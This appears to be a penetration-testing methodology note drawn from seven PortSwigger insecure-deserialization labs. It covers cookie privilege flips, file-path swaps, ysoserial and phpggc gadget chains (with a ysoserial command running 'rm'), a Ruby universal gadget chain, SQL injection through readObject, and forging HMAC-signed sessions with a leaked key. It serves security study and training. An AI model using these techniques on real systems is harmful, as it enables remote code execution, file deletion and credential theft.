# Deserialization Methodology

## Core Concept

Insecure deserialization occurs when attacker-influenced bytes are converted into application objects/state without integrity checks, and a field of that object flows into a security-sensitive operation (privilege check, file action). The cookie/session is not opaque – it is a serialized object graph.

Five shapes validated:
- 2-field `User{username, admin:b}` → privilege flip (`b:0`→`b:1`) → `/admin` → delete carlos.
- 3-field `User{username, access_token, avatar_link:s}` → path swap (`s:19`→`s:23`) → `POST /my-account/delete` deletes arbitrary file (`/home/carlos/morale.txt`).
- Java `lab.actions.common.serializable.AccessTokenUser{accessToken, username}` (`rO0A...`) + Apache Commons Collections → ysoserial `CommonsCollections4` RCE (`rm /home/carlos/morale.txt`) → file delete on any deserializing request (500 trigger still solves).
- Custom PHP gadget (`CustomTemplate{private default_desc_type, private desc}` + `DefaultMap{private callback}` + `Product`) → `__wakeup→build_product→$desc->$default_desc_type` bridge → `DefaultMap.__get→call_user_func(exec, cmd)` → RCE on any session-parsing request (500 trigger still solves). Sources via HTML-comment lib pointer + `~` backup disclosure.
- Custom Java gadget (`data.productcatalog.ProductTemplate.readObject` interpolates `id` into Postgres SQL) → supply serialized `ProductTemplate` as session → SQLi in `id` → error-based extraction (`CAST(password AS numeric)` reflects value) → admin login → delete carlos. No-JDK serialization viable by mirroring known-good bytes. Oracle is exception TYPE (`PSQLException` = bad query vs `ClassCastException` = good query, type mismatch).
- Ruby Marshal (`BAhv` = `04 08`, `o:User` with `@username`/`@access_token`) + vakzz universal default-gem chain (`Requirement#marshal_load→TarReader#each→TarHeader.from→BufferedIO#read→LOG→WriteAdapter#<<→RequestSet#resolve→Kernel.system(cmd)`, `[SpecFetcher, Installer]` autoload pragmas) → RCE on any session-parsing request. Success trace: 500 + `sh: 1: reading: not found` (uncontrolled first call) + `net/protocol.rb:*in 'system'` frame → global `is-solved`. Patched >3.0.2 (server 2.7.0 confirmed vulnerable-range).
- Signed PHP session (`{"token":base64, "sig_hmac_sha1":hmac}`) with phpinfo-leaked `SECRET_KEY` + phpggc pre-built chain matched to leaked framework version (`Symfony 4.3.6` → `Symfony/RCE4` 4.3.0-7, CVE-2019-18889) → RCE. Signing-oracle first (recompute HMAC over captured token), version-range chain select (`phpggc -l`), sign gadget bytes, replay. `Invalid user`-type errors prove signature path works (wrong gadget, right crypto).

## Security Boundary

Intended: client session token ≠ server-side identity/authorization or filesystem path.
Violated when: `client bytes → server object → privileged decision/file action` with no MAC/allowlist.

## Recognition Patterns

- `Set-Cookie: session=Tzo0...` / `...%3d` – base64 with trailing `=` (URL-encoded `%3d`), decodes to `O:4:"..."` (PHP) or `rO0` (Java).
- Signed variant `{"token":base64,"sig_hmac_sha1":hex}` – URL-encoded JSON wrapper; key often leaked via debug `phpinfo.php` (mine `SECRET*`, `*_KEY`, `*TOKEN*`, `*PASS*` + framework versions) before any crypto attack.
- Ruby prefix `BAhv` (`04 08` Marshal v4.8) + `o:<Class>` + `@ivar` symbols → Marshal session; universal-gadget candidate (default gems only), not field edit. Check server Ruby range (≤3.0.2 vakzz chain; newer needs Round-Two variant).
- Java prefix `rO0ABXNyA...` (`0xACED0005`) + class path `lab.actions.common.serializable...` + lab title naming Commons Collections → gadget-chain candidate, not field edit.
- Custom-gadget signals: HTML comments naming lib paths (`/cgi-bin/libs/CustomTemplate.php`), `~` backup files served as `text/plain`, classes with `__wakeup`/`__destruct` + `$x->$y` / `call_user_func` / `unlink` / `file_put_contents` in disclosed source.
- Custom-Java signals: commented-out `/backup/*.java` links + `/backup/` index, `readObject` with `String.format` SQL/JDBC, string product IDs (vs integer), session bytes naming a different class than the one you need.
- Decoded contains `s:N:"..."`, `b:0/1`, `i:N`, `O:N:"Class":M:{...}`.
- Single blob with no `.` HMAC segment → likely no integrity.
- Account pages exposing upload/delete/avatar/profile-path features – candidate dangerous sinks.

## Common Locations

- `session` / `rememberme` / `auth` cookies (base64 serialized objects).
- Account management: `/my-account`, `/my-account/delete`, `/my-account/avatar`, `/admin`, profile update.
- File-referencing attributes: `avatar_link`, `filename`, `path`, `avatar`, `image`.

## Indicators

- Login sets base64 blob that decodes to structured `O:...` / JSON with username/role/path.
- One-bit flip (`b:0`→`b:1`) yields privileged UI (`Admin panel` link, `/admin` 200).
- Path swap + feature invocation yields 302 + session clear + `is-solved`.
- PHP unserialize failure (wrong `s:N`) → silent fallback/400/unchanged state – length is load-bearing.

## Testing Methodology

1. Baseline anon (`GET /` → `is-notsolved`, empty session) + login (`wiener:peter` → 302 + session).
2. Decode session: URL-decode → base64-decode → identify RUNTIME by magic (`O:` PHP, `rO0A` Java, `BAhv`/`04 08` Ruby Marshal). Keep `username`/`access_token` intact.
3. Map consuming features from authenticated pages (delete/upload/admin links) before editing.
4. Choose minimal edit for shape:
   - Boolean/int privilege: flip value, lengths unchanged.
   - String path: replace value + update `s:N` to exact byte length (count: `/home/carlos/morale.txt` = 23).
   - Java + Commons Collections: do NOT hand-edit – generate with ysoserial (`CommonsCollections4` first): `java --add-opens=... (trax, runtime, java.net, java.util on Java 16+) -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0` → URL-encode → replay as `session` to any authenticated endpoint (`/my-account?id=...` suffices).
   - Custom PHP gadget: do NOT reuse field payloads – read lib source (`~` backups, comment pointers) → map entry (`__wakeup`/`__destruct`) → bridge (`$obj->$propname` with controlled name) → sink (`call_user_func`, `exec`, `unlink`) → build graph locally with identical class/private names (Reflection for privates; local `__sleep` unnecessary – server rebuilds via `__wakeup`) → serialize → base64+URL → replay as `session`.
   - Custom Java gadget (`readObject`→SQLi): replicate class bytes without JDK by mirroring a known-good stream (`ACED0005/73/72/FQN/uid/02/fields/78/70/74+len+value`; `serialVersionUID` + FQN must match; `transient` fields omitted) → quote-proof (`'` leaks query) → count via exception-flip (UNION NULLs until `PSQLException` becomes `ClassCastException`) → CAST-extract (`CAST(password AS numeric)` reflects value in error) → USE the credential (login → admin action), never assume row order.
   - Ruby Marshal universal gadget: do NOT hand-craft bytes – adapt vakzz script (default gems only; `CMD` param; `require net/protocol + rubygems/package`; `allocate`+ivar shim for `WriteAdapter` on newer locals; `strict_encode64` for cookies) → check server Ruby range via trigger trace (≤3.0.2 chain; `net/protocol.rb` path + version in error confirms) → replay as `session` → `sh: 1: reading: not found` in 500 body is a SUCCESS indicator (uncontrolled first call), then global marker.
   - Signed PHP session + pre-built chain: do NOT attack crypto – mine debug endpoints for the key first (`phpinfo.php` Environment) → PROVE key via HMAC recompute over captured token (oracle before exploit) → fingerprint framework from failed-trigger errors (`Symfony Version: x.y.z`) → `phpggc -l` range-match (exact range beats habit; Monolog habit vs Symfony evidence) → `phpggc <Chain> <fn> <cmd>` → sign → replay → global marker even on 500. `Invalid user`-type errors = signature OK, gadget wrong – read, don't retry blindly.
5. Re-encode base64 (+ URL-encode if `=`/`+`/`/` present), replay as `session` cookie, one variable at a time.
6. Invoke the consuming feature (`GET /admin`, `POST /my-account/delete`), then check solved/state marker.
7. Keep backup account (`gregg:rosebud` where provided) only if self-deleting blocks verification – here not needed.

## Verification

- Differential: original cookie (no Admin link / no delete effect) vs modified (Admin link + `/admin` 200 + user list, or 302 + session cleared).
- Gadget-chain: trigger may return 500 (deserialization error path) while side-effect still solves – always check global `/` marker (`is-solved`) even on 500. Do not mistake 500 for “not vulnerable” here.
- ReadObject-SQLi: distinguish 500 subtypes – `PSQLException` (query failed – adjust count/types) vs `ClassCastException` (query succeeded – proceed to extraction/login). Extracted strings must be USED (login) before claiming admin; victim/state proof + `is-solved`, not status alone.
- Single-variable: same session fields except target attribute + its length.

## Common Failure Modes

- Copying prior payload verbatim across shapes (`admin b:1` into 3-field object with no `admin` – no effect).
- Copying payloads across RUNTIMES (`Tzo0`/`rO0A`/`BAhv` logic onto a different magic – never transfers; triage magic first: `O:` PHP, `rO0A` Java, `BAhv` Ruby).
- Copying POPULAR chains over EVIDENCE-matched chains (Monolog habit vs leaked `Symfony 4.3.6` → `RCE4` exact range); `phpggc -l` range-match first, habit last.
- Copying field payloads into gadget labs (flag/path/ysoserial bytes into `CustomTemplate` – wrong classes entirely); derive graph from disclosed source.
- Forgetting `s:N` update on string swap → unserialize fails silently.
- Changing `username`/`access_token` together with target → breaks session binding, false negative.
- Miscounting bytes (multibyte, trailing slash) → off-by-one length.
- Assuming 200 = success – need privileged UI + victim file/user state + solved marker.

## Impact Considerations

- Privilege escalation (flag flip → admin → user deletion).
- Authenticated arbitrary file delete (path swap → delete feature → victim file).
- Remote code execution (Java gadget chain → `Runtime.exec` → any OS command; demonstrated `rm`). Same primitive yields reverse shell/exfiltration with attacker command.
- Remote code execution (Ruby universal gadget → `Kernel.system` → any OS command; demonstrated `rm`; trace shows `system` frame + `sh: reading` artifact).
- Remote code execution (signed-session + version-matched pre-built chain → function-call RCE; demonstrated `rm`; key-leak additionally enables arbitrary session forgery).
- Real-world extension: config/key deletion, DoS, further gadget chains where other libs exist.

## Lessons Learned

- From PortSwigger “Modifying serialized objects”: `Tzo0...` → `O:4:"User":2:{...admin b:0}`; `b:0`→`b:1` length-safe; `GET /my-account` gains Admin link → `GET /admin` 200 → `delete?username=carlos` 302 → `is-solved`. No-MAC single blob.
- From PortSwigger “Using application functionality…”: `O:4:"User":3:{...avatar_link s:19}`; `s:19:"users/wiener/avatar"` → `s:23:"/home/carlos/morale.txt"`; `POST /my-account/delete` 302 + session cleared → `is-solved`. Shape dictates sink – decode first, map features, then edit.
- From PortSwigger “Exploiting Java deserialization with Apache Commons”: `rO0A...lab.actions.common.serializable.AccessTokenUser`; `ysoserial CommonsCollections4 'rm /home/carlos/morale.txt'` (Java 25 needs `--add-opens` trax/runtime/net/util) → base64 → URL-encode → `GET /my-account?id=wiener` → 500 trigger → `/` `is-solved`. 500 ≠ failure for RCE-delete; chain first (CC4), trigger on any auth endpoint.
- From PortSwigger “Developing a custom gadget chain for PHP deserialization”: `CustomTemplate.php~` (HTML-comment pointer) reveals `__wakeup→build_product→$desc->$default_desc_type` + `DefaultMap.__get→call_user_func`; graph `CustomTemplate(cmd, DefaultMap(exec))` → serialize → session → 500 trigger → `/` `is-solved`. Source-driven, not payload-driven; local `product=N` harmless (server `__wakeup` rebuilds).
- From PortSwigger “Developing a custom gadget chain for Java deserialization”: `/backup/*.java` (comment pointer + index) reveals `ProductTemplate.readObject` SQLi; Python-mirrored bytes (no JDK) → quote-proof leaks query → 8-NULL UNION flips `PSQLException`→`ClassCastException` (count in one probe) → `CAST(password AS numeric)` reflects `users.password` → admin login → delete carlos → `is-solved`. Exception type is the oracle; credentials must be used, not assumed.
- From PortSwigger “Exploiting Ruby deserialization using a documented gadget chain”: `BAhv` Marshal `o:User(@username,@access_token)`; vakzz universal chain adapted (`CMD` param, `allocate` shim for local 3.3, strict-Base64) → session → 500 with `sh: 1: reading: not found` + `net/protocol.rb:458:in 'system'` (server Ruby 2.7.0) → `/` `is-solved`. `sh: reading` = success artifact; generation (local) kept separate from execution proof (server trace + marker).
- From PortSwigger “Exploiting PHP deserialization with a pre-built gadget chain”: signed `{"token","sig_hmac_sha1"}` session; phpinfo leaks `SECRET_KEY` → HMAC recompute matches captured sig (oracle first); `Monolog/RCE1` fails usefully (`Invalid user` + `Symfony 4.3.6` leak); `phpggc Symfony/RCE4` (range 4.3.0-7) signed → 500 trigger → `/` `is-solved`. Version-range match beats habit; type errors are oracles.

## Related Concepts

- Vertical privilege escalation (methodology/access-control.md – verification discipline)
- File handling / traversal (methodology/traversal.md, file-security.md – path thinking, but here via object field not URL param)
- methodology/verification.md (differential + state proof)

## Sources

- PortSwigger lab: Modifying serialized objects (knowledge/portswigger/labs/deserialization-modifying-serialized-objects.md)
- PortSwigger lab: Using application functionality to exploit insecure deserialization (knowledge/portswigger/labs/deserialization-using-application-functionality.md)
- PortSwigger lab: Exploiting Java deserialization with Apache Commons (knowledge/portswigger/labs/deserialization-java-apache-commons.md)
- PortSwigger lab: Developing a custom gadget chain for PHP deserialization (knowledge/portswigger/labs/deserialization-custom-gadget-chain-php.md)
- PortSwigger lab: Developing a custom gadget chain for Java deserialization (knowledge/portswigger/labs/deserialization-custom-gadget-chain-java.md)
- PortSwigger lab: Exploiting Ruby deserialization using a documented gadget chain (knowledge/portswigger/labs/deserialization-ruby-universal-gadget.md)
- PortSwigger lab: Exploiting PHP deserialization with a pre-built gadget chain (knowledge/portswigger/labs/deserialization-php-prebuilt-gadget-chain.md)
